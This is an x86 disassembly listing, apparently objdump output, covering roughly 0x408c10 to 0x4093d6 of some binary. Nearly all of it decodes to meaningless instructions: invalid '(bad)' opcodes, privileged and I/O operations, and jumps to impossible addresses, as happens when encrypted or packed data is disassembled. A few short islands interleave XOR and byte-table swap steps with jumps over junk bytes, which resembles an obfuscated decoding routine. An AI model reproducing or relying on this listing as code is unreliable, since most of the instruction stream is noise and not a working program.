  408c10:	(bad)  
  408c11:	mov    gs,ecx
  408c13:	ja     0x408bfd
  408c15:	jg     0x408c5f
  408c17:	push   esi
  408c18:	sub    eax,0x101c74fc
  408c1d:	iret   
  408c1e:	add    ah,BYTE PTR [eax+0x26]
  408c21:	mov    bh,0x16
  408c23:	mov    ebp,0x2a9a5fc9
  408c28:	pop    ss
  408c29:	loopne 0x408be3
  408c2b:	call   0xe65756af
  408c30:	xchg   esi,eax
  408c31:	(bad)  
  408c32:	in     al,dx
  408c33:	mov    WORD PTR [eax-0x9f945d8],fs
  408c39:	pop    es
  408c3a:	push   cs
  408c3b:	rol    DWORD PTR [ecx-0x19fafd45],cl
  408c41:	push   ebp
  408c42:	jecxz  0x408c0b
  408c44:	es adc eax,0x34fb3091
  408c4a:	daa    
  408c4b:	or     cl,bh
  408c4d:	adc    al,0x91
  408c4f:	fdivr  DWORD PTR [ecx-0x7b]
  408c52:	call   0xffa0fce
  408c57:	lock push ds
  408c59:	test   edi,ebp
  408c5b:	cmp    BYTE PTR [eax],dh
  408c5d:	adc    BYTE PTR [ebx-0x23],bh
  408c60:	stos   BYTE PTR es:[edi],al
  408c61:	call   0x1fe314cc
  408c66:	xchg   BYTE PTR [edi+0x5a],al
  408c69:	ret    0x8ff5
  408c6c:	(bad)  [ebx]
  408c6e:	xor    ah,BYTE PTR [ebx+esi*1]
  408c71:	test   eax,0xcb42b7c0
  408c76:	jo     0x408c33
  408c78:	mov    cl,0x7f
  408c7a:	push   ss
  408c7b:	std    
  408c7c:	mov    ch,0xeb
  408c7e:	std    
  408c7f:	mov    ss,WORD PTR [esi-0x710273a4]
  408c85:	fwait
  408c86:	xor    BYTE PTR [ebx-0x73],bh
  408c89:	aaa    
  408c8a:	retf   
  408c8b:	dec    DWORD PTR [ebx+0x45]
  408c8e:	mov    ah,0x9b
  408c90:	xor    eax,0x81f32e55
  408c95:	call   0x19ae:0xb3aa2c55
  408c9c:	fcmovb st,st(5)
  408c9e:	mov    al,ds:0xc4581c01
  408ca3:	leave  
  408ca4:	pop    edx
  408ca5:	pushf  
  408ca6:	cmp    al,0x8b
  408ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ca9:	push   edi
  408caa:	adc    BYTE PTR [eax+ecx*8-0x37f12a3b],ch
  408cb1:	xchg   edi,eax
  408cb2:	dec    edi
  408cb3:	sub    edi,DWORD PTR [eax]
  408cb5:	jg     0x408c59
  408cb7:	jge    0x408c40
  408cb9:	clc    
  408cba:	jbe    0x408cab
  408cbc:	or     BYTE PTR [bp+di+0x6fdc],0x97
  408cc2:	leave  
  408cc3:	mov    eax,0xe658b7e7
  408cc8:	arpl   WORD PTR [eax],di
  408cca:	jne    0x408c65
  408ccc:	inc    eax
  408ccd:	cwde   
  408cce:	and    cl,BYTE PTR [edx-0x704c6bed]
  408cd4:	mov    ebp,0x4ad54a3b
  408cd9:	ja     0x408ce5
  408cdb:	and    eax,0x40374fdc
  408ce0:	repz sbb esp,edx
  408ce3:	sub    BYTE PTR [ebx+0x5d],dh
  408ce6:	and    dl,BYTE PTR [ebx-0x52]
  408ce9:	mov    ebx,DWORD PTR [ecx+0x75]
  408cec:	mov    ebx,0x4a29c8a7
  408cf1:	jb     0x408cf2
  408cf3:	int3   
  408cf4:	dec    edi
  408cf5:	into   
  408cf6:	fcmovbe st,st(0)
  408cf8:	adc    esp,DWORD PTR [edx]
  408cfa:	repnz xchg ecx,eax
  408cfc:	and    BYTE PTR [edx],0xea
  408cff:	jecxz  0x408cf8
  408d01:	mov    esi,?
  408d03:	push   esp
  408d04:	fdivrp st(1),st
  408d06:	xor    DWORD PTR [ebp+0x37a08aec],eax
  408d0c:	sar    esi,cl
  408d0e:	in     eax,dx
  408d0f:	sbb    ecx,ecx
  408d11:	add    edi,esp
  408d13:	cmp    eax,0xeb9afea8
  408d18:	pop    ebx
  408d19:	sbb    eax,0x3d5ac74a
  408d1e:	and    edi,DWORD PTR [ecx+ebx*2+0x3c]
  408d22:	aad    0x72
  408d24:	push   cs
  408d25:	js     0x408d5a
  408d27:	stos   BYTE PTR es:[edi],al
  408d28:	pop    esp
  408d29:	dec    ecx
  408d2a:	pop    esp
  408d2b:	ins    DWORD PTR es:[edi],dx
  408d2c:	loope  0x408d75
  408d2e:	mov    ds:0x484a9b53,eax
  408d33:	cmp    BYTE PTR [ecx-0x33],0x6c
  408d37:	imul   dx,WORD PTR [esi-0x1e],0x4c8
  408d3d:	call   DWORD PTR [ecx]
  408d3f:	cld    
  408d40:	dec    ebp
  408d41:	imul   eax,DWORD PTR [ebp+0x48],0xb95e028e
  408d48:	or     eax,0x432ac75f
  408d4d:	sbb    eax,0x5606e767
  408d52:	mov    ah,0x1b
  408d54:	push   esi
  408d55:	fmul   QWORD PTR [edx+0x7c]
  408d58:	jne    0x408d1e
  408d5a:	in     al,0xbd
  408d5c:	and    DWORD PTR [esi+esi*1-0x7626af37],esi
  408d63:	pop    eax
  408d64:	(bad)  
  408d65:	cwde   
  408d66:	test   dl,cl
  408d68:	pop    DWORD PTR [ebx]
  408d6a:	jle    0x408d52
  408d6c:	fadd   QWORD PTR [edi]
  408d6e:	sahf   
  408d6f:	cmp    ch,BYTE PTR [ebp+0x9]
  408d72:	nop
  408d73:	sbb    DWORD PTR [edi+0x2b553c52],ecx
  408d79:	cmp    edi,edi
  408d7b:	pop    eax
  408d7c:	lock retf 0x9a58
  408d80:	pop    ss
  408d81:	fcomi  st,st(7)
  408d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d84:	or     al,0x15
  408d86:	fstp   QWORD PTR [ecx+0x55c954c2]
  408d8c:	jg     0x408d72
  408d8e:	pusha  
  408d8f:	xor    al,0x35
  408d91:	mov    ds:0x558b1201,eax
  408d96:	hlt    
  408d97:	xor    edx,eax
  408d99:	add    edx,DWORD PTR [ebp-0x14]
  408d9c:	mov    edi,DWORD PTR [ebp-0x1c]
  408d9f:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408da6:	mov    BYTE PTR [ebp+0xb],dl
  408da9:	jmp    0x408fbd
  408dae:	bound  ebp,QWORD PTR [ebx-0xa]
  408db1:	popf   
  408db2:	cmc    
  408db3:	mov    eax,ds:0xc8827371
  408db8:	cdq    
  408db9:	ins    BYTE PTR es:[edi],dx
  408dba:	dec    ebx
  408dbb:	or     al,0x39
  408dbd:	ret    
  408dbe:	xchg   ebx,eax
  408dbf:	fidiv  WORD PTR [eax+0x70]
  408dc2:	imul   edi,DWORD PTR [edi+0x70],0xc8e73b70
  408dc9:	mov    DWORD PTR [edi],eax
  408dcb:	neg    DWORD PTR [ecx-0x12]
  408dce:	mov    al,ds:0x599fd03e
  408dd3:	and    ah,dh
  408dd5:	inc    esp
  408dd6:	inc    edx
  408dd7:	aam    0xef
  408dd9:	hlt    
  408dda:	xchg   ebx,eax
  408ddb:	shl    BYTE PTR [esi+0x39],1
  408dde:	data16 sub al,0xd0
  408de1:	push   ds
  408de2:	add    esi,DWORD PTR [esi+0x7c]
  408de5:	mov    gs,WORD PTR [edi]
  408de7:	icebp  
  408de8:	loopne 0x408e04
  408dea:	inc    esp
  408deb:	sbb    eax,ebp
  408ded:	xor    esp,DWORD PTR [ebp+0x8]
  408df0:	lea    esi,[ecx+0x1d7e6216]
  408df6:	scas   al,BYTE PTR es:[edi]
  408df7:	iret   
  408df8:	mov    ch,0x5a
  408dfa:	mov    bl,0x9e
  408dfc:	jo     0x408e00
  408dfe:	(bad)  
  408dff:	sti    
  408e00:	arpl   dx,si
  408e02:	push   ds
  408e03:	out    dx,eax
  408e04:	ins    BYTE PTR es:[edi],dx
  408e05:	adc    ch,BYTE PTR [ebx]
  408e07:	jmp    0xe35d8d99
  408e0c:	repnz or dh,dh
  408e0f:	aam    0x4c
  408e11:	push   edi
  408e12:	das    
  408e13:	mov    dl,BYTE PTR ds:0xcbc64005
  408e19:	lods   eax,DWORD PTR ds:[esi]
  408e1a:	or     al,0x52
  408e1c:	inc    eax
  408e1d:	test   BYTE PTR [esi],ah
  408e1f:	ret    0x185b
  408e22:	or     DWORD PTR [eax],eax
  408e24:	mov    ecx,0xd5db13fc
  408e29:	lods   al,BYTE PTR ds:[esi]
  408e2a:	and    eax,0xaca56ba8
  408e2f:	lock jmp FWORD PTR [edi+0x5d0c5a0a]
  408e36:	push   esp
  408e37:	xchg   ecx,eax
  408e38:	sbb    esi,edx
  408e3a:	xor    DWORD PTR [edx],esi
  408e3c:	lea    ebx,[edi+eax*2]
  408e3f:	shr    DWORD PTR [ebx+0x69],1
  408e42:	add    ch,BYTE PTR [esi+0x271c3f9c]
  408e48:	xor    esi,DWORD PTR [edi+0x72ae902e]
  408e4e:	cmc    
  408e4f:	and    al,0x1b
  408e51:	mov    ds:0xbf8d9121,eax
  408e56:	rcl    BYTE PTR [esi+ecx*8+0x5637f0b2],cl
  408e5d:	sahf   
  408e5e:	inc    edx
  408e5f:	inc    sp
  408e61:	retf   0x9b73
  408e64:	push   esi
  408e65:	or     ch,BYTE PTR [esi+0x5b]
  408e68:	and    esp,0xa5b9ee78
  408e6e:	xchg   ebp,eax
  408e6f:	add    al,0x8b
  408e71:	paddusb mm5,mm7
  408e74:	in     eax,dx
  408e75:	push   ss
  408e76:	push   ss
  408e77:	addr16 aad 0x3b
  408e7a:	inc    esp
  408e7b:	sub    BYTE PTR [esi+eiz*4],cl
  408e7e:	and    ch,0x8f
  408e81:	loope  0x408e4e
  408e83:	mul    esi
  408e85:	mov    cl,0x62
  408e87:	jle    0x408e94
  408e89:	push   edi
  408e8a:	mov    ebp,0xe1f9d75a
  408e8f:	sbb    esp,ecx
  408e91:	cld    
  408e92:	sahf   
  408e93:	adc    ecx,DWORD PTR [esi-0x52]
  408e96:	mov    eax,ds:0xbdbfafd3
  408e9b:	into   
  408e9c:	push   ds
  408e9d:	aaa    
  408e9e:	packssdw mm2,QWORD PTR [ebx]
  408ea1:	xor    BYTE PTR [ecx],dl
  408ea3:	out    dx,al
  408ea4:	test   BYTE PTR [edx],0x82
  408ea7:	and    al,0xf2
  408ea9:	pop    eax
  408eaa:	jae    0x408ef7
  408eac:	push   ebx
  408ead:	retf   0x8402
  408eb0:	sbb    al,0xb1
  408eb2:	aad    0x2e
  408eb4:	add    al,0x8d
  408eb6:	stos   DWORD PTR es:[edi],eax
  408eb7:	and    esi,esp
  408eb9:	push   ds
  408eba:	scas   eax,DWORD PTR es:[edi]
  408ebb:	mov    al,0xb6
  408ebe:	inc    edi
  408ebf:	mov    eax,ds:0x79b2ba18
  408ec4:	arpl   WORD PTR [ebx+0x48eb3ddf],di
  408eca:	fs adc eax,0x970c33f8
  408ed0:	jbe    0x408e71
  408ed2:	inc    ecx
  408ed3:	cmc    
  408ed4:	mov    edx,0x7ec8ce7f
  408ed9:	or     al,0x7a
  408edb:	mov    ds:0x2af66a04,eax
  408ee0:	adc    DWORD PTR [esi-0x32],edi
  408ee3:	mov    al,BYTE PTR [edx+0x5f]
  408ee6:	mov    bh,al
  408ee8:	mov    ds:0x3a20afa2,al
  408eed:	sub    BYTE PTR [ecx],bl
  408eef:	fs mov ebp,0x9511293d
  408ef5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ef6:	pusha  
  408ef7:	lahf   
  408ef8:	or     edx,DWORD PTR [ebx+eiz*8-0x28f2338b]
  408eff:	enter  0x94f5,0xd
  408f03:	jmp    DWORD PTR [esi-0x33]
  408f06:	push   ds
  408f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f08:	xchg   ebp,eax
  408f09:	xor    DWORD PTR [edx-0x60a51e41],ebx
  408f0f:	ins    DWORD PTR es:[edi],dx
  408f10:	pop    edi
  408f11:	push   ds
  408f12:	out    dx,eax
  408f13:	mov    eax,ds:0xeda7b7f7
  408f18:	and    al,0xfd
  408f1a:	and    al,0x1c
  408f1c:	mov    ebx,0x8ae09310
  408f21:	mov    ds:0x274442b0,eax
  408f26:	and    al,0xb5
  408f28:	inc    ecx
  408f29:	jb     0x408f90
  408f2b:	(bad)  
  408f2c:	adc    BYTE PTR [ebp-0x31],dl
  408f2f:	adc    BYTE PTR [ebx+0x7dcb4e3d],0xf6
  408f36:	ds jge 0x408f22
  408f39:	inc    esp
  408f3a:	pop    ebx
  408f3b:	or     eax,0x3163f54a
  408f40:	fdivr  DWORD PTR [eax-0x30e6d290]
  408f46:	and    esp,edx
  408f48:	cli    
  408f49:	pop    esi
  408f4a:	sub    DWORD PTR [edi+0x2],esi
  408f4d:	fnstcw WORD PTR [ecx+0x3e9c0ee9]
  408f53:	imul   ecx,DWORD PTR [esi+edx*2+0x32ccb39c],0xffffffe9
  408f5b:	ret    0xff00
  408f5e:	or     ebx,DWORD PTR [esi+ecx*1-0x6e]
  408f62:	push   DWORD PTR [edx+0x16a94b06]
  408f68:	dec    esi
  408f69:	pusha  
  408f6a:	jo     0x408f47
  408f6c:	mov    ch,0x88
  408f6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f6f:	mov    edi,0x50351381
  408f74:	mov    ecx,esp
  408f76:	(bad)  
  408f77:	scas   eax,DWORD PTR es:[edi]
  408f78:	test   ebp,esi
  408f7a:	into   
  408f7b:	fnstcw WORD PTR [ebp+0x2b]
  408f7e:	neg    BYTE PTR [edx-0x749aa89d]
  408f84:	add    DWORD PTR [ebx-0x313f6ad2],ebx
  408f8a:	sub    ah,BYTE PTR [eax+eiz*8+0x29]
  408f8e:	push   esi
  408f8f:	xor    ecx,esi
  408f91:	dec    eax
  408f92:	sub    al,0xe4
  408f94:	aas    
  408f95:	mov    dh,0xea
  408f97:	jns    0x408f7d
  408f99:	mov    cl,0xac
  408f9b:	pop    ecx
  408f9c:	dec    edx
  408f9d:	pushf  
  408f9e:	add    edi,DWORD PTR [ebp-0x17]
  408fa1:	inc    ebx
  408fa2:	popa   
  408fa3:	xchg   ecx,eax
  408fa4:	and    ebx,DWORD PTR [edx+eiz*1-0x67]
  408fa8:	ss adc eax,0x4513f516
  408fae:	inc    ecx
  408faf:	shl    DWORD PTR [eax-0x2fa88ab3],cl
  408fb5:	xor    al,0xaf
  408fb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fb8:	push   ss
  408fb9:	adc    ah,al
  408fbb:	cmp    BYTE PTR [esi-0x76],bh
  408fbe:	push   ebp
  408fbf:	jnp    0xf8748442
  408fc5:	add    edi,DWORD PTR [ebp-0x14]
  408fc8:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fcb:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fd2:	mov    dl,BYTE PTR [ebp+0xb]
  408fd5:	mov    edi,DWORD PTR [ebp-0x18]
  408fd8:	xor    edi,eax
  408fda:	add    edi,DWORD PTR [ebp-0x14]
  408fdd:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fe0:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  408fe7:	mov    edx,DWORD PTR [ebp-0x44]
  408fea:	mov    edi,DWORD PTR [ebp-0xc]
  408fed:	xor    edx,eax
  408fef:	xor    edi,eax
  408ff1:	add    edx,ecx
  408ff3:	jmp    0x409207
  408ff8:	or     ah,bh
  408ffa:	das    
  408ffb:	mov    ?,ecx
  408ffd:	push   esi
  408ffe:	test   eax,0xbb5c4a63
  409003:	into   
  409004:	call   0x70dc:0x8c25a834
  40900b:	jo     0x409076
  40900d:	jg     0x40907f
  40900f:	jo     0x408fdd
  409011:	and    DWORD PTR [edi],edx
  409013:	bound  ecx,QWORD PTR [ecx-0x171e0f7f]
  409019:	pcmpeqw mm7,QWORD PTR [eax+0x5d2d7a12]
  409020:	adc    eax,0xf2c291df
  409025:	aam    0xb
  409027:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409028:	stos   DWORD PTR es:[edi],eax
  409029:	aad    0x51
  40902b:	jns    0x409058
  40902d:	mov    esi,0x773d8fee
  409032:	in     eax,0xee
  409034:	jmp    esi
  409036:	mov    ds:0x845d469f,eax
  40903b:	stc    
  40903c:	shl    edi,cl
  40903e:	outs   dx,DWORD PTR ds:[esi]
  40903f:	test   eax,0x8f024559
  409044:	jmp    0x409003
  409046:	popa   
  409047:	mov    cl,BYTE PTR [ebx-0x5e]
  40904a:	fidivr DWORD PTR [edi-0x6e]
  40904d:	mov    ebx,0xbce0d325
  409052:	add    esp,DWORD PTR [ebp+0x4d3f03c8]
  409058:	out    0x33,al
  40905a:	sbb    ch,bl
  40905c:	mov    edi,0xd599e8a4
  409061:	pop    ebp
  409062:	pushf  
  409063:	or     al,0xc3
  409065:	jb     0x409054
  409067:	push   ebx
  409068:	(bad)  [esi-0x5731139]
  40906e:	inc    edx
  40906f:	icebp  
  409070:	pop    esp
  409071:	push   edx
  409072:	es repnz inc esi
  409075:	loop   0x4090d2
  409077:	mov    WORD PTR [eax],cs
  409079:	mov    ch,0x4e
  40907b:	mov    bh,BYTE PTR [esi]
  40907d:	repz daa 
  40907f:	adc    dh,0x8e
  409082:	push   ebp
  409083:	jmp    0xd042:0x9b91d5e3
  40908a:	loope  0x4090bf
  40908c:	sbb    al,0x63
  40908e:	lods   eax,DWORD PTR ds:[esi]
  40908f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409090:	mov    ds:0x49657967,al
  409095:	es push ecx
  409097:	int3   
  409098:	jne    0x409068
  40909a:	fnsave [eax+0x10]
  40909d:	inc    edx
  40909e:	fcomp  QWORD PTR [edx]
  4090a0:	mov    edi,0xc55a2efb
  4090a5:	push   0x37fedab4
  4090aa:	dec    esp
  4090ab:	jmp    0xfa7ffa44
  4090b0:	std    
  4090b1:	dec    ecx
  4090b2:	sbb    DWORD PTR [ebx-0xfd13fc4],edi
  4090b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090b9:	mov    edi,0xeeca9b1b
  4090be:	popf   
  4090bf:	dec    ecx
  4090c0:	push   ecx
  4090c1:	into   
  4090c2:	call   0x7dfd:0xdc36cf2e
  4090c9:	jle    0x409115
  4090cb:	inc    ebx
  4090cc:	(bad)  
  4090cd:	out    0xb4,al
  4090cf:	imul   ebp,DWORD PTR [edi-0x7a],0xffffffa2
  4090d3:	mov    ebp,0xe69d7533
  4090d8:	or     ebp,DWORD PTR [edx+0x65]
  4090db:	jne    0x40908d
  4090dd:	int3   
  4090de:	ja     0x40913d
  4090e0:	add    BYTE PTR [edx],al
  4090e2:	sbb    DWORD PTR [edi],0x63
  4090e5:	gs pop edx
  4090e7:	cmc    
  4090e8:	bound  esp,QWORD PTR [ebx]
  4090ea:	out    dx,al
  4090eb:	push   esp
  4090ec:	rol    BYTE PTR [edx],1
  4090ee:	jo     0x4090b5
  4090f0:	mov    al,ds:0xdad1c636
  4090f5:	cmp    bh,bh
  4090f7:	aad    0x83
  4090f9:	je     0x40910b
  4090fb:	scas   eax,DWORD PTR es:[edi]
  4090fc:	adc    bh,0xb7
  4090ff:	rcl    BYTE PTR [ecx+0x73d9c104],1
  409105:	jl     0x40910b
  409107:	call   0x578c10f9
  40910c:	inc    eax
  40910d:	fimul  WORD PTR [ecx+0x325d02f5]
  409113:	sbb    DWORD PTR [edi+0x1a],esp
  409116:	xor    eax,0xcb1175ba
  40911b:	mov    dl,0xbd
  40911d:	lods   eax,DWORD PTR ds:[esi]
  40911e:	test   al,0x46
  409120:	mov    ch,dl
  409122:	je     0x409173
  409124:	jmp    0x4090f4
  409126:	xchg   DWORD PTR [eax+0x6fc99bb7],ecx
  40912c:	sbb    al,0x2
  40912e:	pop    esi
  40912f:	sub    DWORD PTR [edx-0x74f5b59d],eax
  409135:	jmp    0x4090d4
  409137:	push   ecx
  409138:	loope  0x4090fd
  40913a:	mov    cl,0xb
  40913c:	outs   dx,BYTE PTR ds:[esi]
  40913d:	jne    0x4091b7
  40913f:	repz dec ecx
  409141:	or     ecx,DWORD PTR [edi+0x6a7ff9e5]
  409147:	adc    esp,eax
  409149:	dec    ebx
  40914a:	mov    bh,0x62
  40914c:	fwait
  40914d:	cli    
  40914e:	adc    cl,BYTE PTR [ecx+esi*8+0x1f4a7027]
  409155:	cmc    
  409156:	xor    DWORD PTR [edx+0x1576a085],ebp
  40915c:	add    al,0x9f
  40915e:	jecxz  0x40915e
  409160:	dec    eax
  409161:	or     al,0x71
  409163:	lods   al,BYTE PTR ds:[esi]
  409164:	and    bh,ch
  409166:	aad    0x66
  409168:	push   0x57
  40916a:	mov    esp,0x5a8d56fa
  40916f:	cs push edi
  409171:	cmp    dl,BYTE PTR [edx]
  409173:	inc    ebx
  409174:	add    bl,BYTE PTR [eax+0x42]
  409177:	test   BYTE PTR [eax],dl
  409179:	mov    dl,0x67
  40917b:	(bad)  
  40917c:	popa   
  40917d:	push   ecx
  40917e:	adc    al,0x8
  409180:	mov    fs,WORD PTR [edx]
  409182:	aad    0x88
  409184:	push   eax
  409185:	jmp    0xc72a:0xbc105eca
  40918c:	push   esi
  40918d:	and    ah,BYTE PTR [eax-0x3b160572]
  409193:	jmp    0xf136:0xb63fbb83
  40919a:	push   ds
  40919b:	sub    ebx,edi
  40919d:	add    eax,ecx
  40919f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091a0:	or     al,0xa8
  4091a2:	or     eax,0xa24c9eba
  4091a7:	jo     0x4091da
  4091a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091aa:	or     cl,bh
  4091ac:	add    al,0x78
  4091ae:	inc    eax
  4091af:	sbb    eax,0x71093a0f
  4091b4:	fdivr  QWORD PTR [edi+ebx*8+0x34]
  4091b8:	cli    
  4091b9:	and    DWORD PTR [esi+0x7f],edx
  4091bc:	int    0x9f
  4091be:	arpl   si,si
  4091c0:	icebp  
  4091c1:	jg     0x4091fe
  4091c3:	icebp  
  4091c4:	cdq    
  4091c5:	cmc    
  4091c6:	cli    
  4091c7:	jg     0x409218
  4091c9:	jge    0x409243
  4091cb:	jecxz  0x4091c2
  4091cd:	popa   
  4091ce:	popf   
  4091cf:	sub    ecx,DWORD PTR [ecx+0x6a9da76c]
  4091d5:	mov    dh,0x24
  4091d7:	jp     0x40919c
  4091d9:	sbb    dl,BYTE PTR [edx+ecx*1-0x3bc3f8ca]
  4091e0:	adc    DWORD PTR [ebx+0x1e],edx
  4091e3:	sbb    DWORD PTR ds:0x1ad7fda2,ecx
  4091e9:	cvtdq2ps xmm7,XMMWORD PTR [eax+ebp*2]
  4091ed:	pop    edx
  4091ee:	jbe    0x4091a9
  4091f0:	enter  0xc5cc,0xde
  4091f4:	pop    es
  4091f5:	push   edi
  4091f6:	repz adc dh,BYTE PTR [ebx-0x3df01e0a]
  4091fd:	nop
  4091fe:	sub    al,0xca
  409200:	cmp    DWORD PTR [edx+0x6af87afd],0xe9f903ad
  40920a:	lar    eax,WORD PTR [eax]
  40920d:	add    BYTE PTR [edx+0x32072a9a],al
  409213:	xchg   edi,eax
  409214:	mov    cl,0x99
  409216:	js     0x4091b8
  409218:	mov    ah,0x66
  40921a:	and    BYTE PTR [ebp-0x257a140a],0x70
  409221:	jo     0x40928c
  409223:	jg     0x409295
  409225:	jo     0x40925b
  409227:	ss in  al,dx
  409229:	je     0x4092a1
  40922b:	js     0x409203
  40922d:	and    al,BYTE PTR [edi]
  40922f:	mov    al,ds:0xe11d6a3
  409234:	xchg   ebp,eax
  409235:	retf   
  409236:	(bad)  
  409237:	mov    eax,0x3f567477
  40923c:	in     eax,0xd9
  40923e:	mov    ecx,0x7016491e
  409243:	sub    al,0xb9
  409245:	retf   
  409246:	div    BYTE PTR [ebx]
  409248:	stos   BYTE PTR es:[edi],al
  409249:	push   edx
  40924a:	mov    esp,0x3f444595
  40924f:	push   esi
  409250:	sti    
  409251:	lds    esp,FWORD PTR [edi+0x8]
  409254:	repnz mov eax,es:0xa981d3f3
  40925b:	xor    BYTE PTR ds:0xe3405b38,ch
  409261:	(bad)  
  409262:	(bad)  
  409264:	in     eax,0x94
  409266:	cdq    
  409267:	xchg   ecx,eax
  409268:	lock mov eax,ds:0xc6107a7d
  40926e:	jns    0x4092a9
  409270:	cmp    al,0xab
  409272:	inc    edx
  409273:	test   BYTE PTR [eax],ah
  409275:	xor    DWORD PTR [eax+0x59],ebx
  409278:	mov    bl,0xa0
  40927a:	mov    bl,0xeb
  40927c:	ret    
  40927d:	retf   
  40927e:	add    ebp,DWORD PTR [ebp-0x7d]
  409281:	sub    BYTE PTR [ebx+0x40],dl
  409284:	nop
  409285:	inc    ecx
  409286:	ret    
  409287:	sub    al,0x71
  409289:	outs   dx,BYTE PTR ds:[esi]
  40928a:	dec    esp
  40928b:	push   ebx
  40928c:	aad    0xa0
  40928e:	out    dx,al
  40928f:	jmp    0x85fb9460
  409294:	inc    edx
  409295:	(bad)  
  409296:	pop    eax
  409297:	sub    DWORD PTR [ebp-0x459d530b],0xdd4eff9e
  4092a1:	jo     0x409251
  4092a3:	xor    BYTE PTR [esi-0x18a4f82a],0x4
  4092aa:	lods   eax,DWORD PTR ds:[esi]
  4092ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092ac:	(bad)  
  4092ad:	xchg   esp,eax
  4092ae:	js     0x40926f
  4092b0:	stos   DWORD PTR es:[edi],eax
  4092b1:	and    ebx,DWORD PTR [esi-0x13e066d9]
  4092b7:	adc    DWORD PTR [edi],esi
  4092b9:	jecxz  0x409318
  4092bb:	mov    al,0xb9
  4092bd:	xchg   edx,eax
  4092be:	jb     0x40929e
  4092c0:	jge    0x40928c
  4092c2:	push   cs
  4092c3:	aas    
  4092c4:	outs   dx,DWORD PTR ds:[esi]
  4092c5:	and    cl,BYTE PTR ds:0xa934bace
  4092cb:	das    
  4092cc:	(bad)  
  4092ce:	ret    
  4092cf:	and    eax,esp
  4092d1:	add    BYTE PTR [edx-0x4a56ccce],al
  4092d7:	into   
  4092d8:	and    BYTE PTR [ebx-0x15],ch
  4092db:	out    dx,al
  4092dc:	scas   eax,DWORD PTR es:[edi]
  4092dd:	stc    
  4092de:	mov    ds:0xb56a1860,eax
  4092e3:	hlt    
  4092e4:	ret    
  4092e5:	add    eax,DWORD PTR [edx+esi*8+0x6b53a788]
  4092ec:	xor    DWORD PTR [edx],edi
  4092ee:	mov    DWORD PTR [esi+0x7a9451c4],edi
  4092f4:	daa    
  4092f5:	int3   
  4092f6:	xchg   ebp,eax
  4092f7:	ss retf 0x4846
  4092fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092fc:	add    ecx,DWORD PTR [eax]
  4092fe:	pop    edi
  4092ff:	mov    bl,dh
  409301:	out    dx,al
  409302:	xor    al,0xa2
  409304:	aam    0x2c
  409306:	jmp    0xa215578d
  40930b:	xchg   BYTE PTR [ebp-0x14],bh
  40930e:	mov    ah,0x5c
  409310:	pusha  
  409311:	mov    BYTE PTR ds:0xb325da17,ah
  409317:	jno    0x40934e
  409319:	dec    esp
  40931a:	(bad)  
  40931b:	popa   
  40931c:	mov    cl,ch
  40931e:	and    eax,edx
  409320:	js     0x409339
  409322:	repz out dx,al
  409324:	fiadd  WORD PTR [edi]
  409326:	jl     0x409357
  409328:	add    al,0x48
  40932a:	nop
  40932b:	(bad)  
  40932c:	(bad)  
  40932d:	dec    esp
  40932e:	mov    bh,0x16
  409330:	sti    
  409331:	retf   0x485b
  409334:	ds push ebx
  409336:	out    dx,al
  409337:	into   
  409338:	ins    DWORD PTR es:[edi],dx
  409339:	xor    al,0x46
  40933b:	sub    al,dh
  40933d:	push   es
  40933e:	and    al,0x53
  409340:	mov    dh,al
  409342:	invlpg BYTE PTR [ebp+ebx*8+0x40]
  409347:	call   0xbf78:0xfcc72f7a
  40934e:	mov    esi,0x6d692901
  409353:	aaa    
  409354:	mov    ecx,0xecf74c7
  409359:	aaa    
  40935a:	cmp    al,ah
  40935c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40935d:	popa   
  40935e:	jae    0x40938d
  409360:	or     ch,BYTE PTR [edi+0x68]
  409363:	imul   ecx,esi,0xffffffda
  409366:	test   DWORD PTR [edx-0x1d1e9d0c],0x23284156
  409370:	into   
  409371:	pop    eax
  409372:	popf   
  409373:	int3   
  409374:	mov    al,ds:0x523f3da7
  409379:	gs push cs
  40937b:	lea    esp,[esi]
  40937d:	jge    0x4093ab
  40937f:	jbe    0x4093f9
  409381:	repz dec esp
  409383:	js     0x409323
  409385:	test   DWORD PTR [ebp-0x23],ecx
  409388:	inc    ebp
  409389:	shr    DWORD PTR [edx],1
  40938b:	mov    ch,0xd0
  40938d:	dec    ebp
  40938e:	jmp    0x409333
  409390:	cs pushf 
  409392:	mov    ch,0xb5
  409394:	jo     0x4093d5
  409396:	cli    
  409397:	iret   
  409398:	push   es
  409399:	or     esi,DWORD PTR [eax+0x60]
  40939c:	ret    0x7f8f
  40939f:	xchg   esi,eax
  4093a0:	push   esp
  4093a1:	xlat   BYTE PTR ds:[ebx]
  4093a2:	gs inc ecx
  4093a4:	jae    0x40939b
  4093a6:	out    0x7b,al
  4093a8:	or     ecx,0x50dc2324
  4093ae:	push   ebx
  4093af:	ror    DWORD PTR [ebp+0x5ba43268],0x9e
  4093b6:	or     bl,dh
  4093b8:	jmp    0xb837:0x65b9b2f8
  4093bf:	(bad)  
  4093c0:	shl    DWORD PTR [ebx],0x1f
  4093c3:	push   ds
  4093c4:	(bad)  
  4093c5:	xlat   BYTE PTR ds:[ebx]
  4093c6:	dec    ecx
  4093c7:	popf   
  4093c8:	xor    al,0x2b
  4093ca:	cmp    ch,ah
  4093cc:	mov    esp,0xd9d4e70a
  4093d1:	out    0xe,eax
  4093d3:	pop    ecx
  4093d4:	adc    ecx,esi
  4093d6:	pop    ss
